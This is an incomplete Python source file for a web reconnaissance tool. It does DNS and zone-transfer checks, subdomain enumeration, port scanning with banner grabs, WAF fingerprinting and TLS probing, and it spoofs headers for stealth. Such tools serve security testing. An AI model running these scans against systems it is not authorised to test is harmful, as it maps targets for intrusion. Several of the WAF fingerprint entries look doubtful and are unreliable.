#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Recon-X  |  Professional Web Reconnaissance Framework
Runs on: Windows / Linux / Termux / Pydroid3

Optional deps: requests, dnspython
Without them the tool still runs fully through urllib + socket fallbacks.

Every value printed by this tool comes from a live probe. Nothing is
estimated, simulated or filled in with placeholder data.
"""

import os
import re
import sys
import ssl
import json
import time
import socket
import shutil
import struct
import random
import argparse
import tempfile
import datetime
import ipaddress
import subprocess
import warnings
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote
from urllib.request import Request, build_opener, HTTPRedirectHandler
from urllib.error import URLError, HTTPError

# ================= OPTIONAL DEPS =================
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQ = True
except Exception:
    HAS_REQ = False

try:
    import dns.resolver
    import dns.reversename
    import dns.exception
    HAS_DNS = True
except Exception:
    HAS_DNS = False

# CPython exposes _test_decode_cert; some builds (PyPy/Android) do not
try:
    from ssl import _ssl as _ssl_mod
    TEST_DECODE_CERT = getattr(_ssl_mod, "_test_decode_cert", None)
except Exception:
    TEST_DECODE_CERT = None

# ================= COLORS =================
class C:
    G='\033[92m'; DG='\033[32m'; R='\033[91m'; Y='\033[93m'
    B='\033[96m'; W='\033[97m'; GR='\033[90m'; M='\033[95m'
    BOLD='\033[1m'; DIM='\033[2m'; RST='\033[0m'

def _color_enabled():
    """ANSI colors only on a real terminal (isatty + NO_COLOR / FORCE_COLOR)."""
    if os.environ.get("NO_COLOR"):
        return False
    if os.environ.get("FORCE_COLOR"):
        return True
    try:
        return bool(sys.stdout.isatty())
    except Exception:
        return False

USE_COLOR = _color_enabled()
QUIET = False          # --json-only : everything except the JSON goes to stderr

def c(text, color):
    if not USE_COLOR:
        return str(text)
    return f"{color}{text}{C.RST}"

def _emit(text="", color=None):
    line = c(text, color) if color is not None else str(text)
    line = line + "\n"
    stream = sys.stderr if QUIET else sys.stdout
    # Write as UTF-8 bytes to avoid Windows console encoding issues (cp1252)
    try:
        stream.buffer.write(line.encode("utf-8"))
        stream.buffer.flush()
    except (AttributeError, ValueError, OSError):
        try:
            stream.write(line)
            stream.flush()
        except UnicodeEncodeError:
            safe = line.encode("ascii", errors="replace").decode("ascii")
            stream.write(safe)
            stream.flush()

def p_line(text="", color=None):
    _emit(text, color)

def p_ok(label, value, color=C.W):
    _emit(f"  {c('[+]', C.G)} {c(label+':', C.BOLD)}{' ' * max(1, 22-len(label))}{c(str(value), color)}")

def p_warn(label, value):
    _emit(f"  {c('[!]', C.Y)} {c(label+':', C.BOLD)}{' ' * max(1, 22-len(label))}{c(str(value), C.Y)}")

def p_bad(label, value):
    _emit(f"  {c('[x]', C.R)} {c(label+':', C.BOLD)}{' ' * max(1, 22-len(label))}{c(str(value), C.R)}")

def p_note(label, value, color=C.GR):
    _emit(f"  {c('[*]', C.B)} {c(label+':', C.BOLD)}{' ' * max(1, 22-len(label))}{c(str(value), color)}")

def p_section(title, icon="*"):
    _emit()
    _emit(f"{icon}  {title}", C.BOLD + C.G)
    _emit("-" * 68, C.GR)

def shorten(v, n=120):
    v = str(v).replace("\n", " ").strip()
    return v if len(v) <= n else v[:n] + "..."

def clear():
    if os.name == 'nt':
        os.system('cls')
    elif shutil.which('clear'):
        os.system('clear')
    else:
        # Android / Pydroid3 has no 'clear' binary -> ANSI only, no shell noise
        try:
            sys.stdout.buffer.write(b"\033[2J\033[H")
            sys.stdout.buffer.flush()
        except (AttributeError, OSError):
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()

# ================= BANNER + SKULL =================
# ================= BANNER + SKULL =================
SKULL_FRAMES = [
r"""
       .---.
      /     \
     | () () |
      \  ^  /
       '---'
      /|   |\
     / |   | \
""",
r"""
      .---.
     /     \
    | (o o) |
     \  ^  /
      '---'
     /|   |\
    / |   | \
""",
r"""
       .---.
      /     \
     | (O O) |
      \  ^  /
       '---'
      /|   |\
     / |   | \
""",
r"""
        .---.
       /     \
      | (o.o) |
       \  ^  /
        '---'
       /|   |\
      / |   | \
""",
r"""
         .---.
        /     \
       | (O.O) |
        \  ^  /
         '---'
        /|   |\
       / |   | \
""",
]

BANNER = r"""
  ____                           _    __  __
 |  _ \ ___  ___  _ __   ___  __| |  |  \/  | __ _ _ __
 | |_) / _ \/ __|| '_ \ / _ \/ _` |  | |\/| |/ _` | '_ \
 |  _ <  __/\__ \| | | |  __/ (_| |  | |  | | (_| | | | |
 |_| \_\___||___/|_| |_|\___|\__,_|  |_|  |_|\__,_|_| |_|

      Professional Web Reconnaissance Framework  v4.0
      Windows | Linux | Termux | Pydroid3 | Stealth Ready

  Real scans only. No fake data. No placeholders.
"""
def boot_animation():
    clear()
    for _ in range(2):
        for f in SKULL_FRAMES:
            clear()
            _emit(f, C.G)
            time.sleep(0.12)
    clear()
    _emit(SKULL_FRAMES[-1], C.G)
    time.sleep(0.3)
    clear()
    for line in BANNER.splitlines():
        _emit(line, C.G)
        time.sleep(0.04)
    _emit()
    _emit("        Professional Web Recon Framework  v4.0", C.DG)
    _emit("     Windows | Linux | Termux | Pydroid3 | Stealth Ready", C.GR)
    _emit()
    _emit("  [ Welcome ] " + c("", C.BOLD + C.W) + "Real scans only. No fake data.", C.BOLD + C.W)
    _emit("  [ Modules ] " + c("", C.BOLD + C.W) +
          "DNS / RDAP / Subdomains / WAF / Ports / TLS / Headers / Cookies /", C.BOLD + C.W)
    _emit("              Methods / Redirects / Tech / Paths / Robots / Sitemap /", C.BOLD + C.W)
    _emit("              SecTxt / Emails / Geo / RateLimit / Secrets / GraphQL /", C.BOLD + C.W)
    _emit("-" * 68, C.GR)
    _emit()

# ================= HTTP ENGINE =================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

def rnd_ua(): return random.choice(UA_POOL)
def rnd_ip(): return ".".join(str(random.randint(1, 254)) for _ in range(4))

def clean_error(exc):
    """Turn an exception into one readable line (no raw tuple reprs)."""
    reason = getattr(exc, "reason", None)
    if reason:
        if isinstance(reason, BaseException):
            reason = clean_error(reason)
        return f"{type(exc).__name__}: {reason}"
    args = getattr(exc, "args", None)
    if args:
        parts = []
        for a in args:
            if isinstance(a, BaseException):
                parts.append(f"{type(a).__name__}: {a}")
            else:
                parts.append(str(a))
        text = " / ".join(p for p in parts if p)
        if text:
            return text
    text = str(exc)
    return text if text and text != "None" else type(exc).__name__

class NoRedirect(HTTPRedirectHandler):
    """Return 3xx responses instead of following them (real Location header)."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def http_request(url, method="GET", timeout=8, allow_redirects=True, headers=None, data=None):
    """Single HTTP request. Returns ok/status/headers/body/url/elapsed/error."""
    h = {
        "User-Agent": rnd_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
        "Connection": "close",
        "X-Forwarded-For": rnd_ip(),
    }
    if headers:
        h.update(headers)

    if HAS_REQ:
        try:
            r = requests.request(method, url, headers=h, timeout=timeout,
                                 allow_redirects=allow_redirects, verify=False, data=data)
            # collect EVERY Set-Cookie header (requests collapses them in .headers)
            set_cookies = []
            try:
                set_cookies = list(r.raw.headers.get_all("Set-Cookie", []) or [])
            except Exception:
                pass
            if not set_cookies and r.headers.get("Set-Cookie"):
                set_cookies = [r.headers.get("Set-Cookie")]
            return {
                "ok": True,
                "status": r.status_code,
                "headers": {k.lower(): v for k, v in r.headers.items()},
                "body": r.text if r.text else "",
                "url": r.url,
                "elapsed": r.elapsed.total_seconds() if r.elapsed else 0.0,
                "set_cookie_list": set_cookies,
            }
        except Exception as e:
            return {"ok": False, "error": clean_error(e), "status": 0, "headers": {},
                    "body": "", "url": url, "elapsed": 0.0, "set_cookie_list": []}

    # urllib fallback
    try:
        t0 = time.time()
        payload = data.encode() if isinstance(data, str) else data
        req = Request(url, headers=h, method=method, data=payload)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener() if allow_redirects else build_opener(NoRedirect)
        kwargs = {"timeout": timeout}
        if url.lower().startswith("https://"):
            kwargs["context"] = ctx
        with opener.open(req, **kwargs) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            sc_list = [v for (k, v) in resp.getheaders() if k.lower() == "set-cookie"]
            return {
                "ok": True,
                "status": resp.getcode(),
                "headers": {k.lower(): v for k, v in resp.getheaders()},
                "body": body,
                "url": resp.geturl(),
                "elapsed": time.time() - t0,
                "set_cookie_list": sc_list,
            }
    except HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        sc_list = []
        if e.headers:
            try:
                sc_list = [v for (k, v) in e.headers.items() if k.lower() == "set-cookie"]
            except Exception:
                pass
        return {
            "ok": True,
            "status": e.code,
            "headers": {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
            "body": body,
            "url": url,
            "elapsed": 0.0,
            "set_cookie_list": sc_list,
        }
    except URLError as e:
        return {"ok": False, "error": f"URLError: {e.reason}", "status": 0, "headers": {},
                "body": "", "url": url, "elapsed": 0.0}
    except Exception as e:
        return {"ok": False, "error": clean_error(e), "status": 0, "headers": {},
                "body": "", "url": url, "elapsed": 0.0}

def raw_request(host, port, payload, timeout=6, read_bytes=512):
    """Send a raw request over a socket and read the raw reply (CONNECT test)."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(payload)
            data = b""
            try:
                data = s.recv(read_bytes)
            except Exception:
                pass
            return data.decode("utf-8", errors="ignore").strip()
    except Exception as e:
        return f"error: {e}"

# ================= [1] DNS MODULE =================
DNS_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "CAA"]
DNS_UNSUPPORTED_WITHOUT_DNSPYTHON = ["MX", "NS", "TXT", "SOA", "CAA"]

def system_resolve(host):
    """Resolve through the OS resolver (getaddrinfo). Returns (v4, v6, error)."""
    try:
        infos = socket.getaddrinfo(host, None)
        v4 = sorted({i[4][0] for i in infos if i[0] == socket.AF_INET})
        v6 = sorted({i[4][0] for i in infos if i[0] == socket.AF_INET6})
        return v4, v6, None
    except Exception as e:
        return [], [], clean_error(e)

def dns_lookup(host):
    """Live DNS lookup for A/AAAA/MX/NS/TXT/CNAME/SOA/CAA."""
    out = {"records": {}, "errors": {}, "resolver": "", "unsupported": []}
    if not HAS_DNS:
        out["resolver"] = "system resolver (dnspython not installed)"
        out["unsupported"] = list(DNS_UNSUPPORTED_WITHOUT_DNSPYTHON)
        v4, v6, err = system_resolve(host)
        out["records"]["A"] = v4
        out["records"]["AAAA"] = v6
        if err:
            out["errors"]["A"] = f"getaddrinfo failed: {err}"
        return out

    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 8
    out["resolver"] = ", ".join(str(ns) for ns in resolver.nameservers) or "system default"
    query = getattr(resolver, "resolve", None) or getattr(resolver, "query")
    resolver_broken = False
    for rtype in DNS_TYPES:
        try:
            out["records"][rtype] = [str(a) for a in query(host, rtype)]
        except dns.resolver.NXDOMAIN:
            out["records"][rtype] = []
            out["errors"][rtype] = "NXDOMAIN - domain does not exist"
            break
        except dns.resolver.NoAnswer:
            out["records"][rtype] = []
        except dns.resolver.NoNameservers:
            out["records"][rtype] = []
            out["errors"][rtype] = "NoNameservers - every resolver failed"
            resolver_broken = True
        except dns.exception.Timeout:
            out["records"][rtype] = []
            out["errors"][rtype] = "Timeout - resolver did not answer"
            resolver_broken = True
        except Exception as e:
            out["records"][rtype] = []
            out["errors"][rtype] = clean_error(e)

    # the configured resolver may be blocked/refused while the OS resolver works
    if resolver_broken:
        v4, v6, err = system_resolve(host)
        if v4 or v6:
            out["resolver"] += " | fallback: OS resolver"
            if not out["records"].get("A"):
                out["records"]["A"] = v4
                out["errors"].pop("A", None)
            if not out["records"].get("AAAA"):
                out["records"]["AAAA"] = v6
                out["errors"].pop("AAAA", None)
            for rtype in ("MX", "NS", "TXT", "SOA", "CAA"):
                if out["errors"].get(rtype):
                    out["errors"][rtype] += " (not measurable without a working resolver)"
    return out

def reverse_dns(ip):
    """Reverse (PTR) lookup for a single IP."""
    if HAS_DNS:
        try:
            name = dns.reversename.from_address(ip)
            return [str(a) for a in dns.resolver.resolve(name, "PTR")]
        except Exception:
            pass
    try:
        return [socket.gethostbyaddr(ip)[0]]
    except Exception:
        return []

def dns_zone_transfer(host, timeout=5, max_ns=3):
    """Real AXFR attempt against the authoritative nameservers."""
    if not HAS_DNS:
        return None, "dnspython not installed"
    try:
        import dns.query
        ns_answers = dns.resolver.resolve(host, "NS")
    except Exception as e:
        return None, f"no NS records ({e})"
    names = [str(r.target).rstrip(".") for r in ns_answers]
    if not names:
        return None, "no NS records"
    for ns in names[:max_ns]:
        try:
            records = list(dns.query.xfr(ns, host, timeout=timeout, lifetime=timeout))
            if records:
                return True, f"{len(records)} records leaked by {ns}"
        except Exception:
            continue
    return False, f"refused by {', '.join(names[:max_ns])}"

# ================= [2] WHOIS / RDAP MODULE =================
def _rdap_registrar(data):
    for ent in data.get("entities", []) or []:
        roles = [str(r).lower() for r in (ent.get("roles") or [])]
        if "registrar" in roles:
            vcard = ent.get("vcardArray") or []
            if len(vcard) > 1:
                for item in vcard[1]:
                    if isinstance(item, list) and len(item) >= 4 and item[0] == "fn":
                        return str(item[3])
            if ent.get("handle"):
                return str(ent.get("handle"))
    return None

def rdap_lookup(host, timeout=12):
    """Real RDAP query through the public rdap.org bootstrap service."""
    url = f"https://rdap.org/domain/{quote(host)}"
    r = http_request(url, timeout=timeout, headers={"Accept": "application/rdap+json"})
    if not r.get("ok") or r.get("status") != 200:
        return None, f"RDAP HTTP {r.get('status')} {r.get('error', '')}".strip()
    try:
        data = json.loads(r.get("body") or "{}")
    except Exception as e:
        return None, f"invalid RDAP JSON: {e}"

    events = {}
    for ev in data.get("events", []) or []:
        act = str(ev.get("eventAction", "")).lower()
        date = ev.get("eventDate")
        if act and date:
            events.setdefault(act, date)
    out = {
        "handle": data.get("handle"),
        "registrar": _rdap_registrar(data),
        "status": data.get("status", []) or [],
        "created": events.get("registration"),
        "updated": events.get("last changed") or events.get("last update of rdap database"),
        "expires": events.get("expiration"),
        "nameservers": [ns.get("ldhName") for ns in (data.get("nameservers") or []) if ns.get("ldhName")],
        "source": url,
    }
    return out, None

def whois_command_lookup(host, timeout=20):
    """Fallback through the local 'whois' binary when it exists."""
    exe = shutil.which("whois")
    if not exe:
        return None, "whois command not installed"
    try:
        proc = subprocess.run([exe, host], capture_output=True, timeout=timeout)
        text = proc.stdout.decode("utf-8", errors="ignore")
    except Exception as e:
        return None, f"whois failed: {e}"
    if not text.strip():
        return None, "whois returned nothing"

    def grab(pattern):
        m = re.search(pattern, text, re.I)
        return m.group(1).strip() if m else None

    out = {
        "registrar": grab(r"^\s*registrar:\s*(.+)$") or grab(r"^\s*registrar name:\s*(.+)$"),
        "created": grab(r"^\s*creation date:\s*(.+)$") or grab(r"^\s*created(?: on)?:\s*(.+)$"),
        "updated": grab(r"^\s*updated date:\s*(.+)$") or grab(r"^\s*last updated(?: on)?:\s*(.+)$"),
        "expires": grab(r"^\s*(?:registry expiry date|expiry date|paid-till):\s*(.+)$"),
        "status": [l.strip() for l in re.findall(r"^\s*(?:domain status|status):\s*(.+)$", text, re.I | re.M)],
        "nameservers": re.findall(r"^\s*(?:name server|nserver|nameserver):\s*(\S+)", text, re.I | re.M),
        "source": exe,
    }
    return out, None

# ================= [3] SUBDOMAIN ENUMERATION =================
def crtsh_subdomains(domain, timeout=25, limit=200):
    """Real crt.sh certificate-transparency query."""
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    r = http_request(url, timeout=timeout, headers={"Accept": "application/json"})
    if not r.get("ok") or r.get("status") != 200:
        return [], f"crt.sh HTTP {r.get('status')}"
    try:
        data = json.loads(r.get("body") or "[]")
    except Exception as e:
        return [], f"invalid crt.sh JSON: {e}"
    names = set()
    for entry in data:
        for n in str(entry.get("name_value", "")).splitlines():
            n = n.strip().lower().lstrip("*.")
            if n.endswith(domain) and n != domain and "." in n:
                names.add(n)
    return sorted(names)[:limit], None

def resolve_hostname(name, timeout=5):
    """Resolve one name to its A record (real socket lookup)."""
    try:
        ip = socket.gethostbyname(name)
        return {"name": name, "ip": ip, "status": "RESOLVED"}
    except socket.gaierror as e:
        return {"name": name, "ip": None, "status": f"NO-DNS ({e.strerror or e})"}
    except Exception as e:
        return {"name": name, "ip": None, "status": f"ERROR ({e})"}

# ================= [4] WAF / CDN FINGERPRINTING =================
WAF_RULES = [
    ("Cloudflare",       ["cf-ray", "cf-cache-status", "server: cloudflare"], ["__cfduid", "cf_clearance"], ["cloudflare", "error code: 1020", "attention required"]),
    ("Akamai",           ["x-akamai-transformed", "x-akamai-request-id", "server: akamai ghost"], ["ak_bmsc", "_abck"], ["akamai reference", "access denied | akamai"]),
    ("Sucuri",           ["x-sucuri-id", "x-sucuri-cache", "server: sucuri"], [], ["sucuri cloudproxy", "sucuri.net"]),
    ("Imperva",          ["x-cdn: incapsula", "x-iinfo"], ["incap_ses", "visid_incap"], ["incapsula incident id"]),
    ("ModSecurity",      ["server: mod_security", "x-powered-by: mod_security"], [], ["mod_security", "not acceptable"]),
    ("F5 BIG-IP",        ["server: bigip", "x-cnection: close"], ["bigipserver"], ["requested url was rejected"]),
    ("Barracuda",        ["x-barracuda", "server: barracuda"], ["barra_counter_session"], ["barracudawaf"]),
    ("FortiWeb",         ["fortiwafsid"], ["fortiwafsid"], ["fortiweb"]),
    ("AWS WAF / CloudFront", ["x-amz-cf-id", "x-amz-cf-pop", "server: cloudfront"], ["_cf_", "aws-waf"], ["cloudfront", "awswaf"]),
    ("Azure Front Door", ["x-azure-ref", "x-ms-request-id", "server: microsoft-azure"], ["az-"], ["azurewaf"]),
    ("Palo Alto NGFW",   [], [], ["has been blocked in accordance with company policy"]),
    ("Wordfence",        [], ["wfvt_", "wfwaf-authcookie"], ["generated by wordfence"]),
    ("Reblaze",          ["rbzid", "rbzsessionid"], [], ["reblaze"]),
    ("StackPath",        ["x-hw"], ["__sp_cfduid"], ["stackpath"]),
    ("Radware",          ["x-radware", "x-slbd"], [], ["radware", "unavailable due to security restrictions"]),
    ("Fastly",           ["x-fastly-request-id", "fastly-io-info"], [], ["fastly"]),
    ("Varnish",          ["x-varnish", "x-cache: varnish"], [], ["varnish"]),
    ("AWS CloudFront",   ["via: 1.1 abc.cloudfront.net"], [], ["cloudfront.net"]),
    ("Google Cloud Armor", ["server: google frontend", "x-guploader-uploadid"], [], ["google frontend"]),
    ("NetScaler",        ["x-netscape-enterprise", "ns_af", "citrix_ns_id"], ["ns_af", "netscape"], ["netscaler"]),
    ("CitiNetSpeed",     ["x-cdn: citrix", "x-citrix-"], ["ns_"], ["citrix"]),
    ("Cloudbric",        ["server: cloudbric", "x-cloudbric"], [], ["cloudbric"]),
    ("Wallarm",          ["x-wallarm"], [], ["wallarm"]),
    ("AttackIQ",         ["x-attackiq"], [], ["attackiq"]),
    ("F5 Shape",         ["x-f5-shape", "server: f5"], [], ["f5 shape"]),
    ("A10 Thunder",      ["x-a10"], [], ["a10 thunder"]),
    ("Palo Alto Prisma", ["x-prisma", "server: prisma"], [], ["prisma access"]),
]

def detect_waf(resp):
    """Match WAF/CDN fingerprints against the live response."""
    headers = resp.get("headers") or {}
    body = (resp.get("body") or "").lower()
    cookies = (headers.get("set-cookie") or "").lower()
    raw_headers = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

    found = []
    for name, hsigs, csigs, bsigs in WAF_RULES:
        hit = None
        for h in hsigs:
            if h in headers or h in raw_headers:
                hit = f"header '{h}'"
                break
        if not hit:
            for ck in csigs:
                if ck in cookies:
                    hit = f"cookie '{ck}'"
                    break
        if not hit:
            for b in bsigs:
                if b in body:
                    hit = f"body '{b}'"
                    break
        if hit:
            found.append({"name": name, "match": hit})
    return found

# ================= [5] PORT SCANNER =================
COMMON_PORTS = [21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,514,587,631,
                993,995,1080,1433,1521,1723,2049,2181,2375,3000,3128,3306,3389,3690,
                4443,5000,5432,5555,5601,5900,5984,6379,6443,7001,8000,8008,8080,8081,
                8088,8443,8888,9000,9090,9200,9300,10000,11211,15672,27017,27018,
                28017,50000]
RISKY_PORTS = {21:"FTP",22:"SSH",23:"Telnet",445:"SMB",1433:"MSSQL",3306:"MySQL",
               3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",9200:"Elasticsearch",
               27017:"MongoDB",9200:"Elasticsearch",6443:"Kubernetes API",2375:"Docker API"}
SERVICE_MAP = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS", 80:"HTTP", 110:"POP3",
    111:"rpcbind", 135:"MSRPC", 139:"NetBIOS-SSN", 143:"IMAP", 161:"SNMP", 389:"LDAP",
    443:"HTTPS", 445:"SMB", 465:"SMTPS", 514:"Syslog", 587:"SMTP", 631:"IPP", 993:"IMAPS",
    995:"POP3S", 1080:"SOCKS", 1433:"MSSQL", 1521:"Oracle", 1723:"PPTP", 2049:"NFS",
    2181:"ZooKeeper", 2375:"Docker API", 3000:"Node/Flask", 3128:"Squid", 3306:"MySQL",
    3389:"RDP", 3690:"SVN", 4443:"HTTPS-alt", 5000:"Flask", 5432:"PostgreSQL",
    5555:"Android ADB", 5601:"Kibana", 5900:"VNC", 5984:"CouchDB", 6379:"Redis",
    6443:"Kubernetes API", 7001:"WebLogic", 8000:"HTTP-alt", 8008:"Tomcat",
    8080:"HTTP-proxy", 8081:"HTTP-alt", 8088:"HTTP-alt", 8443:"HTTPS-alt",
    8888:"HTTP-alt", 9000:"PHP-FPM", 9090:"Prometheus", 9200:"Elasticsearch",
    9300:"Elasticsearch", 10000:"Webmin", 11211:"Memcached", 15672:"RabbitMQ",
    27017:"MongoDB", 27018:"MongoDB", 28017:"MongoDB", 50000:"DB2",
}

def tcp_probe(host, port, timeout=1.5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False

def port_scan(host, ports=None, timeout=1.5, workers=48):
    """Live TCP connect scan."""
    ports = list(ports or COMMON_PORTS)
    found = []
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = {pool.submit(tcp_probe, host, p, timeout): p for p in ports}
        for fut in as_completed(futures):
            port = futures[fut]
            try:
                if fut.result():
                    found.append(port)
            except Exception:
                pass
    return sorted(found)

TLS_PORTS = {443, 4443, 8443, 9443, 10443}

def grab_tls_banner(host, port, timeout=3):
    """Banner grab over TLS: real handshake + HTTP request, reads the status line."""
    try:
        ctx = _client_ctx()
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                ss.sendall(f"HEAD / HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
                data = ss.recv(1024)
                text = data.decode("utf-8", errors="ignore").strip()
                if not text:
                    return "(no response)"
                first = text.splitlines()[0].strip()
                server = ""
                for line in text.splitlines()[1:]:
                    if line.lower().startswith("server:"):
                        server = line.split(":", 1)[1].strip()
                return f"{first}{(' | ' + server) if server else ''}"
    except Exception as e:
        return f"error: {e}"

def grab_banner(host, port, service, timeout=3):
    """Real protocol banner grab for the detected service."""
    if port in TLS_PORTS:
        return grab_tls_banner(host, port, timeout)
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if service == "SMTP":
                s.sendall(b"EHLO reconx.local\r\n")
                data = s.recv(1024)
            elif service == "Redis":
                s.sendall(b"PING\r\n")
                data = s.recv(1024)
            elif service == "PostgreSQL":
                # SSLRequest packet (length 8, magic 80877103)
                s.sendall(struct.pack("!II", 8, 80877103))
                data = s.recv(1024)
                if data[:1] in (b"S", b"N"):
                    return f"SSLRequest answered '{data[:1].decode()}'"
                return data.decode("utf-8", errors="ignore").strip() or "(no banner)"
            elif service == "MySQL":
                data = s.recv(1024)
                if len(data) > 5:
                    # handshake: 3 byte length, 1 byte seq, 1 byte protocol, then version string
                    ver = data[5:].split(b"\x00")[0]
                    if ver:
                        return ver.decode("utf-8", errors="ignore")
                return "(no banner)"
            else:
                data = s.recv(1024)
            text = data.decode("utf-8", errors="ignore").strip()
            return text.replace("\r\n", " | ") if text else "(no banner)"
    except Exception as e:
        return f"error: {e}"

# ================= [6] TLS / SSL FULL AUDIT =================
TLS_VERSIONS = [("TLSv1", ssl.TLSVersion.TLSv1), ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
                ("TLSv1.2", ssl.TLSVersion.TLSv1_2), ("TLSv1.3", ssl.TLSVersion.TLSv1_3)]
CIPHER_TESTS = [
    ("TLS_RSA_WITH_AES_128_CBC_SHA", "RSA+CBC"),
    ("TLS_RSA_WITH_AES_128_GCM_SHA256", "RSA+GCM"),
    ("TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "ECDHE+RSA+GCM"),
    ("TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "ECDSA+GCM"),
    ("TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256", "CHACHA20"),
    ("TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA", "ECDHE+RSA+CBC"),
]

def _client_ctx(cipher=None):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
    except Exception:
        pass
    if cipher:
        try:
            ctx.set_ciphers(cipher)
        except ssl.SSLError:
            pass
    return ctx

def _pin_version(ctx, ver):
    """Pin the protocol version (legacy versions raise a DeprecationWarning)."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        ctx.minimum_version = ver
        ctx.maximum_version = ver

def tls_handshake_versions(host, port, timeout=8):
    """Try a real handshake with every protocol version."""
    out = {}
    for name, ver in TLS_VERSIONS:
        ctx = _client_ctx()
        try:
            _pin_version(ctx, ver)
        except (ValueError, OSError):
            out[name] = "blocked by local OpenSSL policy"
            continue
        try:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ss:
                    cipher = ss.cipher()
                    out[name] = f"accepted ({cipher[0] if cipher else '?'})"
        except ssl.SSLError as e:
            reason = getattr(e, "reason", None) or str(e) or e.__class__.__name__
            out[name] = f"refused ({reason})"
        except Exception as e:
            out[name] = f"error: {e}"
    return out

def tls_cipher_tests(host, port, timeout=8):
    """Try specific cipher suites against the live server."""
    out = []
    for cipher, label in CIPHER_TESTS:
        ctx = _client_ctx(cipher)
        try:
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            ctx.maximum_version = ssl.TLSVersion.TLSv1_2
        except (ValueError, OSError):
            continue
        try:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ss:
                    used = ss.cipher()
                    out.append({"cipher": cipher, "family": label,
                                "result": f"accepted ({used[0] if used else '?'})", "ok": True})
        except ssl.SSLError:
            out.append({"cipher": cipher, "family": label, "result": "refused", "ok": False})
        except Exception as e:
            out.append({"cipher": cipher, "family": label, "result": f"error: {e}", "ok": False})
    return out

def _flat_rdn(name):
    parts = []
    for rdn in name or ():
        for k, v in rdn:
            parts.append(f"{k}={v}")
    return " | ".join(parts)

def _first_cn(name):
    for rdn in name or ():
        for k, v in rdn:
            if k == "commonName":
                return v
    return None

def _cert_date(value):
    if not value:
        return None
    text = " ".join(str(value).split())
    for fmt in ("%b %d %H:%M:%S %Y %Z", "%b %d %H:%M:%S %Y"):
        try:
            return datetime.datetime.strptime(text, fmt)
        except ValueError:
            continue
    return None

def _decode_cert(der):
    """Decode a DER certificate (CPython path, then cryptography fallback)."""
    if TEST_DECODE_CERT:
        pem = ssl.DER_cert_to_PEM_cert(der)
        tmp = tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False, encoding="utf-8")
        try:
            tmp.write(pem)
            tmp.close()
            return TEST_DECODE_CERT(tmp.name)
        finally:
            try:
                os.unlink(tmp.name)
            except OSError:
                pass
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        cert = x509.load_der_x509_certificate(der)

        def rdn(name_obj):
            val = name_obj.get_attributes_for_oid(NameOID.COMMON_NAME)
            return ((("commonName", val[0].value),),) if val else ()

        sans = []
        try:
            ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            sans = [str(v) for v in ext.value.get_values_for_type(x509.DNSName)]
        except Exception:
            pass
        return {
            "issuer": rdn(cert.issuer),
            "subject": rdn(cert.subject),
            "notAfter": cert.not_valid_after.strftime("%b %d %H:%M:%S %Y GMT"),
            "notBefore": cert.not_valid_before.strftime("%b %d %H:%M:%S %Y GMT"),
            "subjectAltName": tuple(("DNS", s) for s in sans),
        }
    except Exception:
        return None

def cert_covers_host(cert_info, host):
